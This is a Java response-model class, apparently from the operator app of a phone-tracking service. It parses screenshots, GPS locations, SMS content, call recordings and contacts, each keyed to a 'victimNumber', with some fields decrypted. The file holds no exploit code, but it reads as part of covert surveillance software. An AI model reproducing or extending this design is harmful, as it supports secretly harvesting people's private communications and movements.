package com.sunnet.trackapp.client.task.response;

import com.google.gson.annotations.SerializedName;
import com.sunnet.trackapp.client.util.CryptoUtils;

import java.util.List;

public class StatisticalResponse extends BaseResponse {
    @SerializedName("results")
    public Result result;

    public class Result {
        @SerializedName("apiKey")
        public String apiKey;
        @SerializedName("screenshots")
        public List<ScreenShot> screenShotList;
        @SerializedName("locations")
        public List<Location> locationList;
        @SerializedName("smsAndCallRecorders")
        public List<SmsAndRecorder> smsAndRecorderList;
        @SerializedName("contacts")
        public List<Contact> contactList;

        //-- Define classes
        public class ScreenShot {
            @SerializedName("_id")
            public String id;
            @SerializedName("victimNumber")
            public String victimNumber;
            @SerializedName("logs")
            public List<Logs> logsList;

            public class Logs {
                @SerializedName("fileName")
                public String fileName;
                @SerializedName("appPackage")
                public String appPackage;
                @SerializedName("timestamp")
                public long timeStamp;
            }
        }

        public class Location {
            @SerializedName("_id")
            public String id;
            @SerializedName("victimNumber")
            public String victimNumber;
            @SerializedName("logs")
            public List<Logs> logsList;

            public class Logs {
                @SerializedName("lat")
                public String lat;
                @SerializedName("lng")
                public String lng;
                @SerializedName("place")
                public String place;
                @SerializedName("address")
                public String address;
                @SerializedName("timestamp")
                public long timeStamp;
            }
        }

        public class SmsAndRecorder {
            @SerializedName("_id")
            public String id;
            @SerializedName("victimNumber")
            public String victimNumber;
            @SerializedName("victimFriendNumber")
            public String victimFriendNumber;
            @SerializedName("callRecorders")
            public List<Recorder> recorderList;
            @SerializedName("sms")
            public List<Sms> smsList;

            public class Recorder {
                @SerializedName("_id")
                public String id;
                @SerializedName("fileName")
                public String fileName;
                @SerializedName("timestamp")
                public long timeStamp;
                @SerializedName("type")
                public int type;
            }

            public class Sms {
                @SerializedName("_id")
                public String id;
                @SerializedName("content")
                public String content;
                @SerializedName("timestamp")
                public long timeStamp;
                @SerializedName("type")
                public int type;
            }

            public void decrypt() {
                victimNumber = CryptoUtils.decryptReturnValueWhenError(victimNumber);
                victimFriendNumber = CryptoUtils.decryptReturnValueWhenError(victimFriendNumber);
            }
        }

        public class Contact {
            @SerializedName("_id")
            public String id;
            @SerializedName("phoneNumber")
            public String phoneNumber;
            @SerializedName("name")
            public String name;
            @SerializedName("modifyDate")
            public long modifyDate;
        }
    }
}
